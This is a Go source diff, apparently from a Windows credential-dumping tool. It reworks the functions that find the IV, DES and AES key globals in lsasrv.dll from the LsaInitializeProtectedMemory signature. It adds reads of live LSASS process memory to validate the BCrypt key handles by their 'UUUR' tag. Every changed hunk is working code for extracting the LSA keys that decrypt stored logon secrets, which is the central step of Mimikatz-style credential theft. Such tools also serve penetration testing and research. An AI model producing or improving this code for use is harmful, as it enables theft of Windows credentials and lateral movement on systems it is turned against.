@@ -155,7 +155,7 @@ type lsaCryptoGlobals struct {
 // Returns descriptive errors when the signature is missing (likely a Windows
 // build the layout is not calibrated for) or any of the resolved RIP-relative
 // targets fall outside the captured buffer.
-func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout) (lsaCryptoGlobals, error) {
+func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout, reader ...lsassReader) (lsaCryptoGlobals, error) {
 	pat, mask, err := parseHexPattern(layout.Sign)
 	if err != nil {
 		return lsaCryptoGlobals{}, fmt.Errorf("internal: bad LsaInitializeProtectedMemory signature: %w", err)
@@ -170,8 +170,11 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 	aesOff, _, aesOk := resolveRIPRelative(lsasrvBytes, hit+layout.HAesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
 
 	if !ivOk || !desOk || !aesOk {
-		// Try scanning for MOV/LEA instructions near the pattern
-		scanResult, scanErr := scanCryptoGlobals(lsasrvBytes, lsasrvBase, hit, len(pat))
+		var r lsassReader
+		if len(reader) > 0 {
+			r = reader[0]
+		}
+		scanResult, scanErr := scanCryptoGlobals(lsasrvBytes, lsasrvBase, hit, len(pat), r)
 		if scanErr != nil {
 			return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory %q: hardcoded offsets failed (iv=%v des=%v aes=%v at hit=%d) and scan failed: %w",
 				layout.Name, ivOk, desOk, aesOk, hit, scanErr)
@@ -190,7 +193,7 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 // a LsaInitializeProtectedMemory pattern match. It scans for RIP-relative
 // MOV/LEA instructions and validates candidates by checking for the BCrypt
 // 'UUUR' handle tag in the module's data section.
-func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int) (lsaCryptoGlobals, error) {
+func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, reader lsassReader) (lsaCryptoGlobals, error) {
 	bufLen := len(lsasrvBytes)
 
 	// Scan forward from the pattern for the IV LEA instruction.
@@ -216,13 +219,14 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int) 
 		return lsaCryptoGlobals{}, fmt.Errorf("no RIP-relative LEA/MOV found within 50 bytes after pattern at offset %d", hit)
 	}
 
-	// Scan backward from the pattern for RIP-relative instructions whose
-	// targets point to BCrypt handle globals. We validate by reading the
-	// pointer at the target offset, then checking if the pointed-to offset
-	// (also within the module image) has the 'UUUR' BCrypt handle tag.
+	// Scan backward from the pattern for RIP-relative MOV/LEA instructions
+	// whose targets are global variables containing BCrypt handle pointers.
+	// The globals are in lsasrv.dll's .data section, but the handles they
+	// point to are heap-allocated, so we validate by reading through LSASS
+	// process memory.
 	type validatedKey struct {
 		instrOff  int
-		targetOff int // offset of the global variable in lsasrv.dll
+		targetOff int
 	}
 	var keyGlobals []validatedKey
 	seen := make(map[int]bool)
@@ -243,26 +247,32 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int) 
 		}
 		seen[target] = true
 
-		// Read the pointer stored at the global variable
-		ptr := binary.LittleEndian.Uint64(lsasrvBytes[target : target+8])
-		if ptr == 0 {
+		// Target must be in the module's data section (high offsets)
+		if target < bufLen/2 {
 			continue
 		}
 
-		// Convert virtual address to module offset
-		handleVA := uintptr(ptr)
-		if handleVA < lsasrvBase || handleVA >= lsasrvBase+uintptr(bufLen) {
-			continue
-		}
-		handleOff := int(handleVA - lsasrvBase)
-		if handleOff+bcryptHandleKeySize > bufLen {
-			continue
-		}
+		globalAddr := lsasrvBase + uintptr(target)
 
-		// Check for 'UUUR' tag at +4 in the BCrypt handle
-		tag := binary.LittleEndian.Uint32(lsasrvBytes[handleOff+bcryptHandleKeyTagOff : handleOff+bcryptHandleKeyTagOff+4])
-		if tag != bcryptHandleKeyTagWant {
-			continue
+		// Validate: read the pointer from the global, then check for UUUR tag
+		if reader != nil {
+			ptrBytes, err := reader.Read(globalAddr, 8)
+			if err != nil || len(ptrBytes) < 8 {
+				continue
+			}
+			handleAddr := uintptr(binary.LittleEndian.Uint64(ptrBytes))
+			if handleAddr == 0 || handleAddr < 0x10000 {
+				continue
+			}
+			// Read the BCrypt handle header to check for 'UUUR' tag
+			handleBytes, err := reader.Read(handleAddr, uint32(bcryptHandleKeySize))
+			if err != nil || len(handleBytes) < bcryptHandleKeySize {
+				continue
+			}
+			tag := binary.LittleEndian.Uint32(handleBytes[bcryptHandleKeyTagOff : bcryptHandleKeyTagOff+4])
+			if tag != bcryptHandleKeyTagWant {
+				continue
+			}
 		}
 
 		keyGlobals = append(keyGlobals, validatedKey{off, target})
